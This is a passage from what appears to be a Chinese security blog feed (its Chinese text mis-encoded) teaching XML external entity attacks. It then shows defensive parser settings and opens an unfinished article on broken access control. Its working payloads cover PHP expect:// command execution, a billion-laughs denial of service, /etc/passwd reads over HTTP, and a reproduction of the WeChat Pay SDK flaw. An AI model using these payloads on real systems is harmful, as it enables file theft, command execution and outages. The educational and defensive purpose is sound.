id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>ç”±äºŽ PHP çš„ expect å¹¶ä¸æ˜¯é»˜è®¤å®‰è£…æ‰©å±•ï¼Œå¦‚æžœå®‰è£…äº†è¿™ä¸ªexpect æ‰©å±•æˆ‘ä»¬å°±èƒ½ç›´æŽ¥åˆ©ç”¨ XXE è¿›è¡Œ RCE</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"&gt;]&gt;&lt;dir&gt;&lt;file&gt;&amp;cmd;&lt;/file&gt;&lt;/dir&gt;</code></pre><h4 id="2-åˆ©ç”¨-XXE-è¿›è¡Œ-DOS-æ”»å‡»"><a href="#2-åˆ©ç”¨-XXE-è¿›è¡Œ-DOS-æ”»å‡»" class="headerlink" title="2. åˆ©ç”¨ XXE è¿›è¡Œ DOS æ”»å‡»"></a><strong>2. åˆ©ç”¨ XXE è¿›è¡Œ DOS æ”»å‡»</strong></h4><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;?xml version="1.0"?&gt;     &lt;!DOCTYPE lolz [     &lt;!ENTITY lol "lol"&gt;     &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;     &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;     &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;     &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;     &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;     &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;     &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;     &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;     ]&gt;     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><h2 id="äº”ã€çœŸå®žçš„-XXE-å‡ºçŽ°åœ¨å“ª"><a href="#äº”ã€çœŸå®žçš„-XXE-å‡ºçŽ°åœ¨å“ª" class="headerlink" title="äº”ã€çœŸå®žçš„ XXE å‡ºçŽ°åœ¨å“ª"></a><strong>äº”ã€çœŸå®žçš„ XXE å‡ºçŽ°åœ¨å“ª</strong></h2><p>æˆ‘ä»¬åˆšåˆšè¯´äº†é‚£ä¹ˆå¤šï¼Œéƒ½æ˜¯åªæ˜¯æˆ‘ä»¬å¯¹è¿™ä¸ªæ¼æ´žçš„ç†è§£ï¼Œä½†æ˜¯å¥½åƒè¿˜æ²¡è¯´è¿™ç§æ¼æ´žå‡ºçŽ°åœ¨ä»€ä¹ˆåœ°æ–¹</p><p>å¦‚ä»Šçš„ web æ—¶ä»£ï¼Œæ˜¯ä¸€ä¸ªå‰åŽç«¯åˆ†ç¦»çš„æ—¶ä»£ï¼Œæœ‰äººè¯´ MVC  å°±æ˜¯å‰åŽç«¯åˆ†ç¦»ï¼Œä½†æˆ‘è§‰å¾—è¿™ç§åˆ†ç¦»çš„å¹¶ä¸å½»åº•ï¼ŒåŽç«¯è¿˜æ˜¯è¦å°è¯•åŽ»è°ƒç”¨æ¸²æŸ“ç±»åŽ»æŽ§åˆ¶å‰ç«¯çš„æ¸²æŸ“ï¼Œæˆ‘æ‰€è¯´çš„å‰åŽç«¯åˆ†ç¦»æ˜¯ï¼ŒåŽç«¯ api  åªè´Ÿè´£æŽ¥å—çº¦å®šå¥½è¦ä¼ å…¥çš„æ•°æ®ï¼Œç„¶åŽç»è¿‡ä¸€ç³»åˆ—çš„é»‘ç›’è¿ç®—ï¼Œå°†å¾—åˆ°ç»“æžœä»¥ json  æ ¼å¼è¿”å›žç»™å‰ç«¯ï¼Œå‰ç«¯åªè´Ÿè´£åäº«å…¶æˆï¼Œæ‹¿åˆ°æ•°æ®json.decode å°±è¡Œäº†ï¼ˆè¿™é‡Œçš„åŽç«¯å¯ä»¥æ˜¯åŽå°ä»£ç ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤–éƒ¨çš„api  æŽ¥å£ï¼Œè¿™é‡Œçš„å‰ç«¯å¯ä»¥æ˜¯ä¼ ç»Ÿæ„ä¹‰çš„å‰ç«¯ï¼Œä¹Ÿå¯ä»¥æ˜¯åŽå°ä»£ç ï¼‰</p><p>é‚£ä¹ˆé—®é¢˜ç»å¸¸å°±å‡ºçŽ°åœ¨ api æŽ¥å£èƒ½è§£æžå®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„ xml ä»£ç ï¼Œå¹¶ä¸”ç›´æŽ¥å¤–éƒ¨å®žä½“çš„å¼•ç”¨ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ª</p><h3 id="å®žä¾‹ä¸€ï¼šæ¨¡æ‹Ÿæƒ…å†µ"><a href="#å®žä¾‹ä¸€ï¼šæ¨¡æ‹Ÿæƒ…å†µ" class="headerlink" title="å®žä¾‹ä¸€ï¼šæ¨¡æ‹Ÿæƒ…å†µ"></a><strong>å®žä¾‹ä¸€ï¼šæ¨¡æ‹Ÿæƒ…å†µ</strong></h3><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>POST /vulnerable HTTP/1.1Host: www.test.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Referer: https://test.com/test.htmlContent-Type: application/xmlContent-Length: 294Cookie: mycookie=cookies;Connection: closeUpgrade-Insecure-Requests: 1&lt;?xml version="1.0"?&gt;&lt;catalog&gt;   &lt;core id="test101"&gt;      &lt;author&gt;John, Doe&lt;/author&gt;      &lt;title&gt;I love XML&lt;/title&gt;      &lt;category&gt;Computers&lt;/category&gt;      &lt;price&gt;9.99&lt;/price&gt;      &lt;date&gt;2018-10-01&lt;/date&gt;      &lt;description&gt;XML is the best!&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;</code></pre><p>æˆ‘ä»¬å‘å‡º å¸¦æœ‰ xml çš„ POST è¯·æ±‚ä»¥åŽï¼Œè¿°ä»£ç å°†äº¤ç”±æœåŠ¡å™¨çš„XMLå¤„ç†å™¨è§£æžã€‚ä»£ç è¢«è§£é‡Šå¹¶è¿”å›žï¼š{â€œRequest Successfulâ€: â€œAdded!â€}</p><p>ä½†æ˜¯å¦‚æžœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ¶æ„çš„ä»£ç </p><pre><code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;catalog&gt;   &lt;core id="test101"&gt;      &lt;author&gt;John, Doe&lt;/author&gt;      &lt;title&gt;I love XML&lt;/title&gt;      &lt;category&gt;Computers&lt;/category&gt;      &lt;price&gt;9.99&lt;/price&gt;      &lt;date&gt;2018-10-01&lt;/date&gt;      &lt;description&gt;&amp;xxe;&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;</code></pre><p>å¦‚æžœæ²¡æœ‰åšå¥½â€œå®‰å…¨æŽªæ–½â€ å°±ä¼šå‡ºçŽ°è§£æžæ¶æ„ä»£ç çš„æƒ…å†µï¼Œå°±ä¼šæœ‰ä¸‹é¢çš„è¿”å›ž</p><pre><code>{"error": "no results for description root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync...</code></pre><h3 id="å®žä¾‹äºŒï¼šå¾®ä¿¡æ”¯ä»˜çš„-XXE"><a href="#å®žä¾‹äºŒï¼šå¾®ä¿¡æ”¯ä»˜çš„-XXE" class="headerlink" title="å®žä¾‹äºŒï¼šå¾®ä¿¡æ”¯ä»˜çš„ XXE"></a><strong>å®žä¾‹äºŒï¼šå¾®ä¿¡æ”¯ä»˜çš„ XXE</strong></h3><p>å‰ä¸€é˜µå­éžå¸¸ç«çš„å¾®ä¿¡æ”¯ä»˜çš„ XXE æ¼æ´žå½“ç„¶ä¸å¾—ä¸æï¼Œ</p><p><strong>æ¼æ´žæè¿°ï¼š</strong></p><p>å¾®ä¿¡æ”¯ä»˜æä¾›äº†ä¸€ä¸ª api æŽ¥å£ï¼Œä¾›å•†å®¶æŽ¥æ”¶å¼‚æ­¥æ”¯ä»˜ç»“æžœï¼Œå¾®ä¿¡æ”¯ä»˜æ‰€ç”¨çš„java  sdkåœ¨å¤„ç†ç»“æžœæ—¶å¯èƒ½è§¦å‘ä¸€ä¸ªXXEæ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥å‘è¿™ä¸ªæŽ¥å£å‘é€æž„é€ æ¶æ„payloads,èŽ·å–å•†å®¶æœåŠ¡å™¨ä¸Šçš„ä»»ä½•ä¿¡æ¯ï¼Œä¸€æ—¦æ”»å‡»è€…èŽ·å¾—äº†æ•æ„Ÿçš„æ•°æ® (md5-key and merchant-Id etc.)ï¼Œä»–å¯èƒ½é€šè¿‡å‘é€ä¼ªé€ çš„ä¿¡æ¯ä¸ç”¨èŠ±é’±å°±è´­ä¹°å•†å®¶ä»»æ„ç‰©å“</p><p>æˆ‘ä¸‹è½½äº† java ç‰ˆæœ¬çš„ sdk è¿›è¡Œåˆ†æžï¼Œè¿™ä¸ª sdk æä¾›äº†ä¸€ä¸ª WXPayUtil å·¥å…·ç±»ï¼Œè¯¥ç±»ä¸­å®žçŽ°äº†xmltoMapå’ŒmaptoXmlè¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œè€Œè¿™æ¬¡çš„å¾®ä¿¡æ”¯ä»˜çš„xxeæ¼æ´žçˆ†å‘ç‚¹å°±åœ¨xmltoMapæ–¹æ³•ä¸­</p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png" alt="img"></a></p><p>é—®é¢˜å°±å‡ºçŽ°åœ¨æˆ‘æ¨ªçº¿åˆ’å‡ºæ¥çš„é‚£éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ç®€åŒ–ä¸ºä¸‹é¢çš„ä»£ç ï¼š</p><pre><code>public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception {        try {            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();            InputStream stream = new ByteArrayInputStream(strXML.getBytes("UTF-8"));            org.w3c.dom.Document doc = documentBuilder.parse(stream);            ...</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° å½“æž„å»ºäº† documentBuilder ä»¥åŽå°±ç›´æŽ¥å¯¹ä¼ è¿›æ¥çš„ strXML  è§£æžäº†ï¼Œè€Œä¸å·§çš„æ˜¯ strXML æ˜¯ä¸€å¤„æ”»å‡»è€…å¯æŽ§çš„å‚æ•°ï¼ŒäºŽæ˜¯å°±å‡ºçŽ°äº† XXE æ¼æ´žï¼Œä¸‹é¢æ˜¯æˆ‘å®žéªŒçš„æ­¥éª¤</p><p>é¦–å…ˆæˆ‘åœ¨ com åŒ…ä¸‹åˆæ–°å»ºäº†ä¸€ä¸ªåŒ…ï¼Œæ¥å†™æˆ‘ä»¬çš„æµ‹è¯•ä»£ç ï¼Œæµ‹è¯•ä»£ç æˆ‘å‘½åä¸º test001.java</p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png" alt="img"></a></p><p><strong>test001.java</strong></p><pre><code>package com.test.test001;import java.util.Map;import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;public class test001 {    public static void main(String args[]) throws Exception {        String xmlStr ="&lt;?xml version='1.0' encoding='utf-8'?&gt;\r\n" +                "&lt;!DOCTYPE XDSEC [\r\n" +                "&lt;!ENTITY xxe SYSTEM 'file:///d:/1.txt'&gt;]&gt;\r\n" +                "&lt;XDSEC&gt;\r\n"+                "&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\r\n" +                "&lt;/XDSEC&gt;";        try{            Map&lt;String,String&gt; test = xmlToMap(xmlStr);            System.out.println(test);        }catch (Exception e){            e.printStackTrace();        }    }}</code></pre><p>æˆ‘å¸Œæœ›å®ƒèƒ½è¯»å–æˆ‘ D ç›˜ä¸‹é¢çš„ 1.txt æ–‡ä»¶</p><p>è¿è¡ŒåŽæˆåŠŸè¯»å–</p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png" alt="img"></a></p><p>å½“ç„¶ï¼ŒWXPayXmlUtil.java ä¸­æœ‰è¿™ä¸ª sdk çš„é…ç½®é¡¹ï¼Œèƒ½ç›´æŽ¥å†³å®šå®žéªŒçš„æ•ˆæžœï¼Œå½“ç„¶åŽæœŸçš„ä¿®å¤ä¹Ÿæ˜¯é’ˆå¯¹è¿™é‡Œé¢è¿›è¡Œä¿®å¤çš„</p><pre><code>http://apache.org/xml/features/disallow-doctype-decl truehttp://apache.org/xml/features/nonvalidating/load-external-dtd falsehttp://xml.org/sax/features/external-general-entities falsehttp://xml.org/sax/features/external-parameter-entities false</code></pre><p>æ•´ä¸ªæºç æˆ‘æ‰“åŒ…å¥½äº†å·²ç»ä¸Šä¼ åˆ°æˆ‘çš„ç™¾åº¦äº‘ï¼Œæœ‰å…´è¶£çš„ç«¥éž‹å¯ä»¥è¿è¡Œä¸€ä¸‹æ„Ÿå—ï¼š</p><blockquote><p>é“¾æŽ¥ï¼š<a href="https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw">https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw</a>  æå–ç ï¼šxq1b</p></blockquote><p>ä¸Šé¢è¯´è¿‡ java ä¸­æœ‰ä¸€ä¸ª netdoc:/ åè®®èƒ½ä»£æ›¿ file:/// ,æˆ‘çŽ°åœ¨æ¥æ¼”ç¤ºä¸€ä¸‹ï¼š</p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png" alt="img"></a></p><h3 id="å®žä¾‹ä¸‰ï¼šJSON-content-type-XXE"><a href="#å®žä¾‹ä¸‰ï¼šJSON-content-type-XXE" class="headerlink" title="å®žä¾‹ä¸‰ï¼šJSON content-type XXE"></a><strong>å®žä¾‹ä¸‰ï¼šJSON content-type XXE</strong></h3><p>æ­£å¦‚æˆ‘ä»¬æ‰€çŸ¥é“çš„ï¼Œå¾ˆå¤šwebå’Œç§»åŠ¨åº”ç”¨éƒ½åŸºäºŽå®¢æˆ·ç«¯-æœåŠ¡å™¨äº¤äº’æ¨¡å¼çš„webé€šä¿¡æœåŠ¡ã€‚ä¸ç®¡æ˜¯SOAPè¿˜æ˜¯RESTfulï¼Œä¸€èˆ¬å¯¹äºŽwebæœåŠ¡æ¥è¯´ï¼Œæœ€å¸¸è§çš„æ•°æ®æ ¼å¼éƒ½æ˜¯XMLå’ŒJSONã€‚å°½ç®¡webæœåŠ¡å¯èƒ½åœ¨ç¼–ç¨‹æ—¶åªä½¿ç”¨å…¶ä¸­ä¸€ç§æ ¼å¼ï¼Œä½†æœåŠ¡å™¨å´å¯ä»¥æŽ¥å—å¼€å‘äººå‘˜å¹¶æ²¡æœ‰é¢„æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œè¿™å°±æœ‰å¯èƒ½ä¼šå¯¼è‡´JSONèŠ‚ç‚¹å—åˆ°XXEï¼ˆXMLå¤–éƒ¨å®žä½“ï¼‰æ”»å‡»</p><h4 id="åŽŸå§‹è¯·æ±‚å’Œå“åº”ï¼š"><a href="#åŽŸå§‹è¯·æ±‚å’Œå“åº”ï¼š" class="headerlink" title="åŽŸå§‹è¯·æ±‚å’Œå“åº”ï¼š"></a><strong>åŽŸå§‹è¯·æ±‚å’Œå“åº”ï¼š</strong></h4><p><strong>HTTP Request:</strong></p><pre><code>POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38{"search":"name","value":"netspitest"}</code></pre><p><strong>HTTP Response:</strong></p><pre><code>HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43{"error": "no results for name netspitest"}</code></pre><p>çŽ°åœ¨æˆ‘ä»¬å°è¯•å°† Content-Type ä¿®æ”¹ä¸º application/xml</p><h4 id="è¿›ä¸€æ­¥è¯·æ±‚å’Œå“åº”ï¼š"><a href="#è¿›ä¸€æ­¥è¯·æ±‚å’Œå“åº”ï¼š" class="headerlink" title="è¿›ä¸€æ­¥è¯·æ±‚å’Œå“åº”ï¼š"></a><strong>è¿›ä¸€æ­¥è¯·æ±‚å’Œå“åº”ï¼š</strong></h4><p><strong>HTTP Request:</strong></p><pre><code>POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 38{"search":"name","value":"netspitest"}</code></pre><p><strong>HTTP Response:</strong></p><pre><code>HTTP/1.1 500 Internal Server ErrorContent-Type: application/jsonContent-Length: 127{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}</code></pre><p>å¯ä»¥å‘çŽ°æœåŠ¡å™¨ç«¯æ˜¯èƒ½å¤„ç† xml æ•°æ®çš„ï¼ŒäºŽæ˜¯æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ”»å‡»</p><h4 id="æœ€ç»ˆçš„è¯·æ±‚å’Œå“åº”ï¼š"><a href="#æœ€ç»ˆçš„è¯·æ±‚å’Œå“åº”ï¼š" class="headerlink" title="æœ€ç»ˆçš„è¯·æ±‚å’Œå“åº”ï¼š"></a><strong>æœ€ç»ˆçš„è¯·æ±‚å’Œå“åº”ï¼š</strong></h4><p><strong>HTTP Request:</strong></p><pre><code>POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;</code></pre><p><strong>HTTP Response:</strong></p><pre><code>HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467{"error": "no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync....</code></pre><h2 id="å…­ã€XXE-å¦‚ä½•é˜²å¾¡"><a href="#å…­ã€XXE-å¦‚ä½•é˜²å¾¡" class="headerlink" title="å…­ã€XXE å¦‚ä½•é˜²å¾¡"></a><strong>å…­ã€XXE å¦‚ä½•é˜²å¾¡</strong></h2><h3 id="æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æŽ¨èçš„ç¦ç”¨å¤–éƒ¨å®žä½“çš„æ–¹æ³•"><a href="#æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æŽ¨èçš„ç¦ç”¨å¤–éƒ¨å®žä½“çš„æ–¹æ³•" class="headerlink" title="æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æŽ¨èçš„ç¦ç”¨å¤–éƒ¨å®žä½“çš„æ–¹æ³•"></a><strong>æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æŽ¨èçš„ç¦ç”¨å¤–éƒ¨å®žä½“çš„æ–¹æ³•</strong></h3><p><strong>PHPï¼š</strong></p><pre><code>libxml_disable_entity_loader(true);</code></pre><p><strong>JAVA:</strong></p><pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);.setFeature("http://xml.org/sax/features/external-general-entities",false).setFeature("http://xml.org/sax/features/external-parameter-entities",false);</code></pre><p><strong>Pythonï¼š</strong></p><pre><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h3 id="æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤-ä¸æŽ¨è"><a href="#æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤-ä¸æŽ¨è" class="headerlink" title="æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤(ä¸æŽ¨è)"></a><strong>æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤(ä¸æŽ¨è)</strong></h3><p>è¿‡æ»¤å…³é”®è¯ï¼š</p><pre><code>&lt;!DOCTYPEã€&lt;!ENTITY SYSTEMã€PUBLIC</code></pre><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/3357#toc-17">https://xz.aliyun.com/t/3357#toc-17</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:è¶Šæƒæ¼æ´ž</title>
      <link href="2021/05/25/web-yue-quan-lou-dong/"/>
      <url>2021/05/25/web-yue-quan-lou-dong/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/25/web-yue-quan-lou-dong/bf3856202467094de30685ac16dc5f3.png" alt="bf3856202467094de30685ac16dc5f3"></p><h3 id="ä¸€ã€æ¼æ´žæè¿°"><a href="#ä¸€ã€æ¼æ´žæè¿°" class="headerlink" title="ä¸€ã€æ¼æ´žæè¿°"></a>ä¸€ã€æ¼æ´žæè¿°</h3><p>è¶Šæƒè®¿é—®ï¼ˆBroken Access Controlï¼Œç®€ç§°BACï¼‰æ˜¯Webåº”ç”¨ç¨‹åºä¸­ä¸€ç§å¸¸è§çš„æ¼æ´žï¼Œç”±äºŽå…¶å­˜åœ¨èŒƒå›´å¹¿ã€å±å®³å¤§ï¼Œè¢«OWASPåˆ—ä¸ºWebåº”ç”¨åå¤§å®‰å…¨éšæ‚£çš„ç¬¬äºŒåã€‚</p><p>è¯¥æ¼æ´žæ˜¯æŒ‡åº”ç”¨åœ¨æ£€æŸ¥æŽˆæƒæ—¶å­˜åœ¨çº°æ¼ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨èŽ·å¾—ä½Žæƒé™ç”¨æˆ·è´¦æˆ·åŽï¼Œåˆ©ç”¨ä¸€äº›æ–¹å¼ç»•è¿‡æƒé™æ£€æŸ¥ï¼Œè®¿é—®æˆ–è€…æ“ä½œå…¶ä»–ç”¨æˆ·æˆ–è€…æ›´é«˜æƒé™ã€‚è¶Šæƒæ¼æ´žçš„æˆå› ä¸»è¦æ˜¯å› ä¸ºå¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢žã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šï¼Œä¸€æ—¦æƒé™éªŒè¯ä¸å……åˆ†ï¼Œå°±æ˜“è‡´è¶Šæƒæ¼æ´žã€‚</p><h3 id="äºŒã€æ¼æ´žåˆ†ç±»"><a href="#äºŒã€æ¼æ´žåˆ†ç±»" class="headerlink" title="äºŒã€æ¼æ´žåˆ†ç±»"></a>äºŒã€æ¼æ´žåˆ†ç±»</h3><p>è¶Šæƒè®¿é—®æ¼æ´žä¸»è¦åˆ†ä¸ºæ°´å¹³è¶Šæƒã€åž‚ç›´è¶Šæƒã€‚</p><p>æ°´å¹³è¶Šæƒï¼šæŒ‡æ”»å‡»è€…å°è¯•è®¿é—®ä¸Žä»–æ‹¥æœ‰ç›¸åŒæƒé™çš„ç”¨æˆ·èµ„æºã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·Aå’Œç”¨æˆ·Bå±žäºŽåŒä¸€è§’è‰²ï¼Œæ‹¥æœ‰ç›¸åŒçš„æƒé™ç­‰çº§ï¼Œä»–ä»¬èƒ½èŽ·å–è‡ªå·±çš„ç§æœ‰æ•°æ®ï¼ˆæ•°æ®Aå’Œæ•°æ®Bï¼‰ï¼Œä½†å¦‚æžœç³»ç»ŸåªéªŒè¯äº†èƒ½è®¿é—®æ•°æ®çš„è§’è‰²ï¼Œè€Œæ²¡æœ‰å¯¹æ•°æ®åšç»†åˆ†æˆ–è€…æ ¡éªŒï¼Œå¯¼è‡´ç”¨æˆ·Aèƒ½è®¿é—®åˆ°ç”¨æˆ·Bçš„æ•°æ®ï¼ˆæ•°æ®Bï¼‰ï¼Œé‚£ä¹ˆç”¨æˆ·Aè®¿é—®æ•°æ®Bçš„è¿™ç§è¡Œä¸ºå°±å«åšæ°´å¹³è¶Šæƒè®¿é—®ã€‚</p><p><img src="https://pic1.zhimg.com/80/v2-7e8703b4ba7932bff7e4829e2f324898_720w.jpg" alt="img"></p><p>åž‚ç›´è¶Šæƒï¼šç”±äºŽåŽå°åº”ç”¨æ²¡æœ‰åšæƒé™æŽ§åˆ¶ï¼Œæˆ–ä»…ä»…åœ¨èœå•ã€æŒ‰é’®ä¸Šåšäº†æƒé™æŽ§åˆ¶ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·åªè¦çŒœæµ‹å…¶ä»–ç®¡ç†é¡µé¢çš„URLæˆ–è€…æ•æ„Ÿçš„å‚æ•°ä¿¡æ¯ï¼Œå°±å¯ä»¥è®¿é—®æˆ–æŽ§åˆ¶å…¶ä»–è§’è‰²æ‹¥æœ‰çš„æ•°æ®æˆ–é¡µé¢ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚</p><p><img src="https://pic3.zhimg.com/80/v2-0c7ce5db8f3634fed66d2766b593ddda_720w.jpg" alt="img"></p><h3 id="ä¸‰ã€æ¼æ´žäº§ç”Ÿçš„åŽŸå› "><a href="#ä¸‰ã€æ¼æ´žäº§ç”Ÿçš„åŽŸå› " class="headerlink" title="ä¸‰ã€æ¼æ´žäº§ç”Ÿçš„åŽŸå› "></a>ä¸‰ã€æ¼æ´žäº§ç”Ÿçš„åŽŸå› </h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ª Web ç¨‹åºåŠŸèƒ½æµç¨‹æ˜¯ç™»å½• - æäº¤è¯·æ±‚ - éªŒè¯æƒé™ - æ•°æ®åº“æŸ¥è¯¢ - è¿”å›žç»“æžœã€‚å¦‚æžœéªŒè¯æƒé™ä¸è¶³ï¼Œä¾¿ä¼šå¯¼è‡´è¶Šæƒã€‚å¸¸è§çš„ç¨‹åºéƒ½ä¼šè®¤ä¸ºé€šè¿‡ç™»å½•åŽå³å¯éªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼Œä»Žè€Œä¸ä¼šåšä¸‹ä¸€æ­¥éªŒè¯ï¼Œæœ€åŽå¯¼è‡´è¶Šæƒã€‚</p><p>\1. é€šè¿‡éšè— URL</p><p>å®žçŽ°æŽ§åˆ¶è®¿é—®æœ‰äº›ç¨‹åºçš„ç®¡ç†å‘˜çš„ç®¡ç†é¡µé¢åªæœ‰ç®¡ç†å‘˜æ‰æ˜¾ç¤ºï¼Œæ™®é€šç”¨æˆ·çœ‹ä¸åˆ°ï¼Œåˆ©ç”¨ URL å®žçŽ°è®¿é—®æŽ§åˆ¶ï¼Œä½† URL æ³„éœ²æˆ–è¢«æ¶æ„æ”»å‡»è€…çŒœåˆ°åŽï¼Œè¿™ä¼šå¯¼è‡´è¶Šæƒæ”»å‡»ã€‚</p><p>\2. 